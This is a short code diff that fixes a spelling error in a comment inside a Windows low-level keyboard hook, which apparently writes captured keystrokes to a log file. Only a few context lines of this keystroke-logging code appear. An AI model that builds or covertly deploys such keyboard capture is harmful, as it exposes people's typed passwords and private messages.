@@ -43,7 +43,7 @@ LRESULT CALLBACK LowLevelKeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
             logfile.flush();
         }
         else if (wParam == WM_KEYUP || wParam == WM_SYSKEYUP) {
-            // To make sure the keys won't get stucked
+            // To make sure the keys won't get stuck
         }
     }
 
